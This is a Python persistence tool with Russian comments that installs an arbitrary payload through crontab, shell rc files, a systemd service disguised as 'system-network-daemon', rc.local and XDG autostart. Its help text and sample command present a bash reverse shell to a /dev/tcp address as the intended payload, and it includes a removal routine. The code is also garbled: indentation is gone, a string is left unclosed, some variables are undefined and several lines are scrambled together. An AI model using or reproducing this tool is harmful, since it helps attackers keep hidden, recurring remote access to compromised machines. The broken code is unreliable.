#!/usr/bin/env python3
import os
import subprocess
import argparse
import json
import stat
from pathlib import Path
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
PERSISTENCE_LOG = "/tmp/.persist_log.json"
installed = []
def log_install(method: str, path: str) -> None:
installed.append({"method": method, "path": path})
def is_root() -> bool:
return os.geteuid() == 0
def install_crontab(payload: str) -> bool:
try:
current = subprocess.run(["crontab", "-l"],
capture_output=True, text=True)
existing = current.stdout if current.returncode == 0 else ""
cron_entry = f"@reboot {payload}\n"
# Также добавляем периодическое выполнение
cron_periodic = f"*/5 * * * * {payload}\n"
new_crontab = existing + cron_entry + cron_periodic
process = subprocess.run(["crontab", "-"],
input=new_crontab, capture_output=True, text=True)
if process.returncode == 0:
print(f" {GREEN}[+] Crontab установлен (@reboot + каждые 5
мин){RESET}")
log_install("crontab", "crontab -l")
return True
except Exception as e:
print(f" {RED}[-] Crontab: {e}{RESET}")
return False
def install_bashrc(payload: str) -> bool:
rc_files = [
os.path.expanduser("~/.bashrc"),
os.path.expanduser("~/.profile"),
os.path.expanduser("~/.bash_profile"),
]
marker = "# system_update_daemon"
payload_line = f"\n{marker}\n{payload} &\n"
for rc_file in rc_files:
if os.path.exists(rc_file):
try:
with open(rc_file) as f:
content = f.read()
if marker not in content:
with open(rc_file, "a") as f:
f.write(payload_line)
print(f" {GREEN}[+] Добавлено в {rc_file}{RESET}")
log_install("bashrc", rc_file)
return True
except (PermissionError, OSError):
pass
return False
def install_systemd_service(payload: str) -> bool:
if not is_root():
print(f" {YELLOW}[-] systemd: нужен root{RESET}")
return False
service_name = "system-network-daemon"
service_path = f"/etc/systemd/system/{service_name}.service"
service_content = f"""[Unit]
Description=System Network Daemon
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c '{payload}'
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target
try:
with open(service_path, "w") as f:
f.write(service_content)
subprocess.run(["systemctl", "enable", service_name], capture_output=True)
subprocess.run(["systemctl", "start", service_name], capture_output=True)
print(f" {GREEN}[+] Systemd сервис установлен: {service_name}{RESET}")
log_install("systemd", service_path)
return True
except Exception as e:
print(f" {RED}[-] Systemd: {e}{RESET}")
return False
def install_rc_local(payload: str) -> bool:
if not is_root():
return False
rc_local = "/etc/rc.local"
marker = "# update_daemon"
try:
if os.path.exists(rc_local):
with open(rc_local) as f:
content = f.read()
else:
content = "#!/bin/bash\nexit 0\n"
if marker not in content:
# Вставляем перед 'exit 0'
new_content = content.replace(
"exit 0",
f"{marker}\n{payload} &\n\nexit 0"
)
with open(rc_local, "w") as f:
f.write(new_content)
os.chmod(rc_local, 0o755)
print(f" {GREEN}[+] rc.local установлен{RESET}")
log_install("rc.local", rc_local)
return True
except Exception as e:
print(f" {RED}[-] rc.local: {e}{RESET}")
return False
def install_autostart_xdg(payload: str) -> bool:
try:
with open(desktop_file, "w") as f:
f.write(content)
print(f" {GREEN}[+] XDG Autostart установлен{RESET}")
log_install("xdg_autostart", desktop_file)
return True
except Exception as e:
print(f" {RED}[-] XDG Autostart: {e}{RESET}")
return False
def remove_all() -> None:
print(f"{YELLOW}[*] Удаляем persistence...{RESET}")
if os.path.exists(PERSISTENCE_LOG):
with open(PERSISTENCE_LOG) as f:
log = json.load(f)
else:
log = []
for entry in log:
method = entry["method"]
path = entry["path"]
if method == "crontab":
subprocess.run(["crontab", "-r"], capture_output=True)
print(f" {GREEN}[+] Crontab очищен{RESET}")
elif method in ("bashrc", "rc.local"):
if os.path.exists(path):
try:
with open(path) as f:
content = f.read()
marker = "# system_update_daemon\n# update_daemon"
for m in ["# system_update_daemon", "# update_daemon"]:
# Удаляем блок от маркера до следующей пустой строки
lines = content.split("\n")
filtered = []
skip = False
for line in lines:
if m in line:
skip = True
elif skip and line.strip() == "":
skip = False
continue
if not skip:
filtered.append(line)
content = "\n".join(filtered)
with open(path, "w") as f:
f.write(content)
print(f" {GREEN}[+] {path} очищен{RESET}")
except Exception:
pass
elif method == "systemd":
service_name = os.path.basename(path).replace(".service", "")
subprocess.run(["systemctl", "stop", service_name], capture_output=True)
subprocess.run(["systemctl", "disable", service_name],
capture_output=True)
if os.path.exists(path):
os.remove(path)
print(f" {GREEN}[+] Systemd сервис удалён{RESET}")
elif method == "xdg_autostart":
if os.path.exists(path):
os.remove(path)
print(f" {GREEN}[+] XDG Autostart удалён{RESET}")
if os.path.exists(PERSISTENCE_LOG):
os.remove(PERSISTENCE_LOG)
print(f"{GREEN}[✓] Cleanup завершён{RESET}")
def main():
parser = argparse.ArgumentParser(description="Persistence Installer/Remover")
parser.add_argument("--payload", default=None,
help="Команда для запуска (reverse shell, etc)")
parser.add_argument("--install", action="store_true", help="Установить
persistence")
parser.add_argument("--remove", action="store_true", help="Удалить все
persistence")
args = parser.parse_args()
ifargs.remove:
remove_all()
return
if not args.payload:
print(f"{RED}[!] Укажи --payload{RESET}")
print(f" Пример: --payload 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'")
return
print(f"{CYAN}[*] Устанавливаем persistence...{RESET}")
print(f"{CYAN}[*] Права: {'root' if is_root() else 'user'}{RESET}")
print(f"{CYAN}[*] Payload: {args.payload[:60]}{RESET}")
print("-" * 50)
methods_tried = []
ifis_root():
methods_tried.append(("systemd", install_systemd_service(args.payload)))
methods_tried.append(("rc.local", install_rc_local(args.payload)))
methods_tried.append(("crontab",methods_tried.append(("bashrc",methods_tried.append(("xdg",
install_crontab(args.payload)))
install_bashrc(args.payload)))
install_autostart_xdg(args.payload)))
if installed:
with open(PERSISTENCE_LOG, "w") as f:
json.dump(installed, f)
success = sum(1 for _, ok in methods_tried if ok)
print(f"\n{GREEN}[✓] Установлено методов:
{success}/{len(methods_tried)}{RESET}")
if __name__ == "__main__":
main()
